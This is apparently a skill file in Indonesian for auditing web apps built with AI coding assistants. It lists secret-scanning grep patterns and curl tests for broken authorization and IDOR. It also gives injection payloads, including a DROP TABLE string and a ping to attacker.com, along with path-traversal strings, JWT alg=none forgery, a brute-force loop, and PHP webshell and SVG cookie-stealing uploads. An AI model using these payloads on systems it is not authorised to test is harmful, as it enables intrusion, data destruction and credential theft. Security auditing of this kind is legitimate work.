---
name: hunt-ai-code
description: "Hunt celah keamanan pada website/aplikasi yang dibangun dengan AI coding assistant (vibe coding) — Cursor, GitHub Copilot, Claude Code, v0.dev, Bolt, Lovable, dll. AI-generated code 2.74x lebih rentan dari kode manusia. 25% kode AI punya confirmed vulnerability. 41% backend AI punya overly-broad permissions. Gunakan saat klien/target pakai AI untuk coding, atau saat kamu mau test website hasil buatan sendiri sebelum serah terima."
version: 1.0.0
sources: paperclipped.de, appsec-santa-2026, cloud-security-alliance, softwareseni
---

# Hunt: AI-Generated Code Vulnerabilities (Vibe Coding Security Audit 2026)

> Statistik 2026: AI-generated code = 2.74x lebih banyak vulnerability dari human code.
> 10.000+ security findings baru per bulan dari AI-generated repositories (per Juni 2025).
> 58% developer percaya output AI tanpa testing → false sense of security.

---

## Pattern #1 — Hardcoded Secrets & API Keys

AI coder sering generate sample code dengan credentials hardcoded.

```bash
# Grep langsung di codebase
grep -rE "(api_key|apikey|secret|password|token|API_KEY)\s*=\s*['\"][^'\"]{10,}" .
grep -rE "sk-[a-zA-Z0-9]{48}" .           # OpenAI key
grep -rE "xnd_[a-zA-Z0-9_]{30,}" .        # Xendit key
grep -rE "AKIA[0-9A-Z]{16}" .             # AWS Access Key
grep -rE "ghp_[a-zA-Z0-9]{36}" .          # GitHub token
grep -rE "xoxb-[0-9]+-[a-zA-Z0-9]+" .    # Slack token

# Cek file yang TIDAK seharusnya ada di repo
git log --all --full-history -- .env
git log --all --full-history -- config.js
git show HEAD:.env 2>/dev/null
```

**Hotspot:** File `.env.example` yang berisi real key, `config.js` dengan key hardcoded, commit history yang menyimpan key lama.

---

## Pattern #2 — Overly-Broad Permissions (41% kode AI)

AI generate CRUD endpoint tanpa role-based access control.

```bash
# Test endpoint admin tanpa auth
curl -X DELETE https://target.com/api/users/1
curl -X PUT https://target.com/api/users/1 -d '{"role":"admin"}'
curl https://target.com/api/admin/dashboard
curl https://target.com/api/users          # list semua user?

# Test mass assignment — kirim field yang tidak seharusnya bisa diubah
curl -X PATCH /api/profile \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"id":1,"role":"admin","verified":true,"balance":999999}'

# Cek apakah JWT decode menggunakan algorithm yang lemah
# Decode JWT di jwt.io, cek header "alg" field
# Jika alg=HS256 dengan secret lemah → brute force
```

---

## Pattern #3 — Input Validation Lemah

AI sering skip sanitasi input, terutama untuk SQL dan shell.

```bash
# SQL Injection — AI sering pakai string concatenation
# Test di semua input field
' OR '1'='1
' UNION SELECT table_name FROM information_schema.tables--
"; DROP TABLE users; --

# Command Injection — AI sering pakai exec/system untuk "convenience"
# Target: input yang dikirim ke proses (image conversion, PDF gen, dll)
; id
| whoami
`id`
$(id)
& ping -c 3 attacker.com

# Path Traversal — AI sering lupa sanitasi path
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
```

---

## Pattern #4 — IDOR / Missing Authorization

AI generate endpoint tapi sering lupa cek "apakah user ini punya akses ke resource ini?"

```bash
# Test IDOR standar — ganti ID dengan milik user lain
GET /api/orders/1001        # order milik user lain
GET /api/invoices/500
GET /api/messages/thread/99

# Test dengan token user biasa ke endpoint admin
curl /api/admin/logs -H "Authorization: Bearer USER_TOKEN"
curl /api/users -H "Authorization: Bearer USER_TOKEN"

# IDOR di file download
GET /api/files/download?filename=../../../etc/passwd
GET /api/export?user_id=1&format=csv   # ganti user_id
```

---

## Pattern #5 — Error Handling yang Bocor (OWASP A10:2025)

AI sering tidak handle error dengan baik → stack trace bocor ke user.

```bash
# Trigger error untuk lihat stack trace
# Kirim input tidak valid
curl /api/users/NOT_A_NUMBER
curl /api/search?q[]=array_input_where_string_expected
curl /api/payment -d '{"amount":"abc"}'

# Test dengan method yang salah
curl -X DELETE /api/public-resource
OPTIONS /api/internal/endpoint

# Null/undefined injection
curl /api/profile -d '{"name":null,"email":null}'
curl /api/search?q=

# Cek apakah error response bocorkan:
# - Stack trace dengan path file server
# - Versi library/framework
# - Query SQL yang gagal
# - Connection string database
```

---

## Pattern #6 — Authentication Lemah

AI sering generate auth yang insecure by default.

```bash
# Test password yang lemah diizinkan
curl -X POST /api/register -d '{"email":"test@test.com","password":"123"}'
curl -X POST /api/register -d '{"email":"test@test.com","password":"password"}'

# Test rate limiting login
for i in {1..100}; do
  curl -X POST /api/login -d '{"email":"target@email.com","password":"wrong'$i'"}'
done

# Test JWT manipulation
# Decode token di jwt.io
# Coba ubah payload (ganti role/id) dan re-encode
# Coba alg=none: header {"alg":"none","typ":"JWT"}

# Test session tidak expired
# Login → ambil token → tunggu 24 jam → coba pakai lagi

# Test reset password yang lemah
# Token predictable? Token tidak expired? Token bisa dipakai ulang?
```

---

## Pattern #7 — Insecure File Upload

AI sering generate upload handler tanpa validasi tipe file.

```bash
# Upload file berbahaya
# PHP webshell
curl -X POST /api/upload -F "file=@shell.php;type=image/jpeg"

# HTML file untuk XSS stored
curl -X POST /api/upload -F "file=@xss.html;type=text/plain"

# SVG dengan script (bypass image validation)
# File: evil.svg
# <svg><script>alert(document.cookie)</script></svg>

# Double extension
mv shell.php shell.php.jpg
curl -X POST /api/upload -F "file=@shell.php.jpg"

# Setelah upload, coba akses file langsung
GET /uploads/shell.php
GET /static/uploads/evil.svg
```

---

## Checklist Audit Website Vibe Coding / AI-Generated

```
[ ] Scan seluruh codebase untuk hardcoded secrets (grep -rE patterns)
[ ] Cek git history untuk credential yang pernah di-commit
[ ] Test semua CRUD endpoint tanpa auth dan dengan auth user biasa
[ ] Test mass assignment di setiap PUT/PATCH endpoint
[ ] Fuzz semua input field dengan SQL injection payloads
[ ] Fuzz dengan command injection payloads jika ada proses server
[ ] Test IDOR: ganti semua ID numerik dengan milik user lain
[ ] Trigger error di semua endpoint — cek apakah stack trace bocor
[ ] Test login brute force — ada rate limiting tidak?
[ ] Test JWT: coba alg=none, decode dan modifikasi payload
[ ] Test file upload: coba upload PHP/HTML/SVG
[ ] Cek apakah ada endpoint debug yang tidak dihapus (/debug, /test, /dev)
[ ] Test dengan: undefined, null, array, negatif, 0 sebagai input
```

---

## Tools Cepat untuk Audit AI-Code

```bash
# Semgrep — static analysis untuk pola vulnerability AI-code
semgrep --config=p/owasp-top-ten .
semgrep --config=p/secrets .

# Nuclei — scan otomatis endpoint
nuclei -u https://target.com -t ~/nuclei-templates/

# truffleHog — scan secret di git history
trufflehog git https://github.com/target/repo

# Gitleaks — cari secret di repo
gitleaks detect --source . -v
```
